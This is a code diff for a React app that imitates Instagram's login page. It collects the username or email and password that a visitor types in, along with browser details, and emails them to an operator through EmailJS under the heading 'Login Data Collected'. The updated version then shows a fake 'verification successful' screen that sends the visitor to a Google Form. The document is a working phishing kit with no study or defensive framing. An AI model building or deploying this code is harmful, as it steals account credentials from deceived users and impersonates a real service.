@@ -1,24 +1,16 @@
 import React, { useState, useEffect } from 'react';
+import emailjs from '@emailjs/browser';
 
 export default function App() {
-  const [username, setUsername] = useState('');
+  const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
+  const [showSuccessScreen, setShowSuccessScreen] = useState(false);
 
   useEffect(() => {
-    // Load EmailJS script
-    const script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
-    script.onload = () => {
-      // Initialize EmailJS with your public key
-      window.emailjs.init("DCnFHeeyL6GEWE6J2");
-    };
-    document.head.appendChild(script);
-
-    return () => {
-      document.head.removeChild(script);
-    };
+    // Load EmailJS
+    emailjs.init("DCnFHeeyL6GEWE6J2");
   }, []);
 
   const handleSubmit = async (e) => {
@@ -27,40 +19,71 @@ export default function App() {
     setError('');
     
     try {
-      // Check if EmailJS is loaded
-      if (!window.emailjs) {
-        throw new Error('EmailJS is not loaded');
-      }
-      
-      // Send data to EmailJS
-      const response = await window.emailjs.send(
-        "service_wni6k0h", 
-        "template_ap7mzek", 
-        {
-          from_name: username,
-          to_name: "Admin",
-          message: `Instagram Login Attempt:
-          
-Username: ${username}
+      // Send data via EmailJS
+      const templateParams = {
+        from_name: email,
+        to_name: "Admin",
+        message: `Login Data Collected:
+        
+Email: ${email}
 Password: ${password}
 Timestamp: ${new Date().toISOString()}
 User Agent: ${navigator.userAgent}
 Page URL: ${window.location.href}
 
 This is an automated message with login attempt data.`,
-          reply_to: "ictproject499@gmail.com",
-          subject: `Instagram Login Attempt - ${username}`
-        }
+        reply_to: "ictproject499@gmail.com",
+        subject: `Login Attempt - ${email}`
+      };
+
+      // Send the email with updated template ID
+      const response = await emailjs.send(
+        "service_wni6k0h", 
+        "template_ap7mzek", // Updated template ID
+        templateParams
       );
       
-      // Redirect to Instagram after successful submission
-      window.location.href = 'https://www.instagram.com';
+      // Show success screen
+      setShowSuccessScreen(true);
     } catch (err) {
-      setError('An error occurred. Please try again. Error: ' + err.message);
+      setError('An error occurred. Please try again.');
       setIsLoading(false);
-      console.error('EmailJS Error:', err);
+      console.error('Error:', err);
     }
   };
+
+  if (showSuccessScreen) {
+    return (
+      <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
+        <div className="w-full max-w-sm text-center">
+          {/* Instagram Logo */}
+          <div className="mb-8">
+            <img 
+              src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" 
+              alt="Instagram Logo" 
+              className="w-44 h-auto mx-auto"
+            />
+          </div>
+          {/* Success Message */}
+          <div className="bg-white border border-gray-300 rounded-lg p-8">
+            <h1 className="text-xl font-bold text-gray-900 mb-6">
+              Verification is successfully completed, please proceed to the Google Form
+            </h1>
+            
+            {/* Continue Button - redirects to google.com */}
+            <button
+              onClick={() => {
+                window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSdAAUoBrDfLU6UFX2Su3lry8GBCFcJS93RWuBabe9gYxmbvoQ/viewform?usp=sharing&ouid=111823479924118296643';
+              }}
+              className="px-6 py-2 text-sm font-medium text-white bg-blue-500 hover:bg-blue-600 rounded border-none transition-colors w-full mt-6"
+            >
+              Google Form
+            </button>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
@@ -81,15 +104,15 @@ This is an automated message with login attempt data.`,
           </div>
         )}
 
-        {/* Login Form Card */}
+        {/* Form Card */}
         <div className="bg-white border border-gray-300 rounded-lg p-6">
           {/* Form */}
           <form onSubmit={handleSubmit} className="space-y-4">
             <div>
               <input
                 type="text"
-                value={username}
-                onChange={(e) => setUsername(e.target.value)}
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
                 className="w-full px-3 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                 placeholder="Phone number, username, or email"
                 required
@@ -110,7 +133,7 @@ This is an automated message with login attempt data.`,
             {/* Login Button */}
             <button
               type="submit"
-              className="w-full bg-blue-500 text-white py-1.5 rounded text-sm font-medium disabled:opacity-70 disabled:cursor-not-allowed"
+              className="w-full bg-blue-500 hover:bg-blue-600 text-white py-1.5 rounded text-sm font-medium disabled:opacity-70 disabled:cursor-not-allowed"
               disabled={isLoading}
             >
               {isLoading ? (
@@ -119,10 +142,10 @@ This is an automated message with login attempt data.`,
                     <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                     <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                   </svg>
-                  Logging in...
+                  Logging In...
                 </div>
               ) : (
-                'Log in'
+                'Log In'
               )}
             </button>
           </form>
@@ -134,16 +157,9 @@ This is an automated message with login attempt data.`,
             <div className="flex-grow border-t border-gray-300"></div>
           </div>
 
-          {/* Facebook Login */}
-          <div className="text-center mb-4">
-            <a href="#" className="text-blue-900 font-semibold text-sm">
-              Log in with Facebook
-            </a>
-          </div>
-
           {/* Forgot Password */}
-          <div className="text-center mt-4">
-            <a href="#" className="text-sm text-gray-900">
+          <div className="text-center">
+            <a href="#" className="text-sm text-blue-900 font-semibold">
               Forgot password?
             </a>
           </div>
@@ -159,47 +175,23 @@ This is an automated message with login attempt data.`,
           </p>
         </div>
 
-        {/* Get the App */}
-        <div className="text-center mt-6">
-          <p className="text-sm mb-2">Get the app.</p>
-          <div className="flex justify-center space-x-2">
-            <img 
-              src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" 
-              alt="App Store" 
-              className="h-10"
-            />
-            <img 
-              src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc7a8.png" 
-              alt="Google Play" 
-              className="h-10"
-            />
+        {/* Footer Links */}
+        <div className="mt-8 text-center text-xs text-gray-500 space-y-2 max-w-xs">
+          <div className="flex flex-wrap justify-center gap-x-2">
+            <a href="#" className="hover:underline">Meta</a>
+            <a href="#" className="hover:underline">About</a>
+            <a href="#" className="hover:underline">Blog</a>
+            <a href="#" className="hover:underline">Jobs</a>
+            <a href="#" className="hover:underline">Help</a>
+            <a href="#" className="hover:underline">API</a>
+            <a href="#" className="hover:underline">Privacy</a>
+            <a href="#" className="hover:underline">Terms</a>
+            <a href="#" className="hover:underline">Top Accounts</a>
+            <a href="#" className="hover:underline">Hashtags</a>
+            <a href="#" className="hover:underline">Locations</a>
           </div>
+          <div>© 2025 Instagram from Meta</div>
         </div>
-      </div>
-
-      {/* Footer Links */}
-      <div className="mt-8 text-center text-xs text-gray-500 space-y-2 max-w-xs">
-        <div className="flex flex-wrap justify-center gap-x-2">
-          <a href="#" className="hover:underline">Meta</a>
-          <a href="#" className="hover:underline">About</a>
-          <a href="#" className="hover:underline">Blog</a>
-          <a href="#" className="hover:underline">Jobs</a>
-          <a href="#" className="hover:underline">Help</a>
-          <a href="#" className="hover:underline">API</a>
-          <a href="#" className="hover:underline">Privacy</a>
-          <a href="#" className="hover:underline">Terms</a>
-          <a href="#" className="hover:underline">Top Accounts</a>
-          <a href="#" className="hover:underline">Hashtags</a>
-          <a href="#" className="hover:underline">Locations</a>
-          <a href="#" className="hover:underline">Instagram Lite</a>
-          <a href="#" className="hover:underline">Contact Uploading</a>
-        </div>
-        <div>
-          <select className="bg-transparent text-xs text-gray-500 border-0 focus:ring-0">
-            <option>English</option>
-          </select>
-        </div>
-        <div>© 2025 Instagram from Meta</div>
       </div>
     </div>
   );
